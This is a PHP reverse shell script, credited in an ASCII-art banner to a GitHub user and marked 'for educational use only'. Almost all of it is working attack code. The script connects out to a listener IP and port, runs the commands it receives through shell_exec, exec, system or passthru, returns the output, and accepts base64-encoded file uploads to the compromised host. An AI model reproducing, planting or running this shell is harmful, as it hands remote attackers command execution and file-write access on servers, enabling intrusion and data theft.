// ░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░░▒▓███████▓▒░▒▓████████▓▒░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░   ░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░
// ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
// ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
// ░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░    ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░  ░▒▓█▓▒░     
// ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
// ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
//  ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
// 
//
//       Reverse Shell Script by Github/Gh0stlyKn1ght - For Educational Use Only       

<?php
// Reverse Shell PHP Script with Advanced Features
// WARNING: Use this script for educational and authorized testing purposes only.

// Define target IP address and port for the reverse shell.
$target_ip = "192.168.1.10"; // Replace with your listening server's IP.
$target_port = 1234;         // Replace with your listening server's port.

// Create a TCP/IP socket.
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    die("Socket creation failed: " . socket_strerror(socket_last_error()) . "\n");
}

// Connect to the target IP and port.
if (!socket_connect($socket, $target_ip, $target_port)) {
    die("Socket connection failed: " . socket_strerror(socket_last_error($socket)) . "\n");
}

// Send a connection success message to the listener.
socket_write($socket, "Connection established\n");

// Function to execute commands and return output.
function execute_command($command) {
    $output = '';
    if (function_exists('shell_exec')) {
        $output = shell_exec($command);
    } elseif (function_exists('exec')) {
        exec($command, $output_lines);
        $output = implode("\n", $output_lines);
    } elseif (function_exists('system')) {
        ob_start();
        system($command);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command);
        $output = ob_get_clean();
    } else {
        $output = "Command execution not available.";
    }
    return $output;
}

// Loop to handle commands from the listener.
while (true) {
    $command = socket_read($socket, 2048, PHP_NORMAL_READ);
    if ($command === false) {
        break; // Break the loop if the connection is closed or an error occurs.
    }

    $command = trim($command);

    // Handle special commands.
    if ($command === "exit") {
        socket_write($socket, "Connection closing.\n");
        break;
    } elseif ($command === "upload") {
        socket_write($socket, "Enter file name:\n");
        $file_name = trim(socket_read($socket, 2048, PHP_NORMAL_READ));
        socket_write($socket, "Enter file contents (base64 encoded):\n");
        $file_contents_base64 = trim(socket_read($socket, 2048, PHP_NORMAL_READ));
        if (!file_put_contents($file_name, base64_decode($file_contents_base64))) {
            socket_write($socket, "File upload failed.\n");
        } else {
            socket_write($socket, "File uploaded successfully: $file_name\n");
        }
        continue;
    }

    // Execute the command and send the output back.
    $output = execute_command($command);
    socket_write($socket, $output . "\n");
}

// Close the socket.
socket_close($socket);
?>
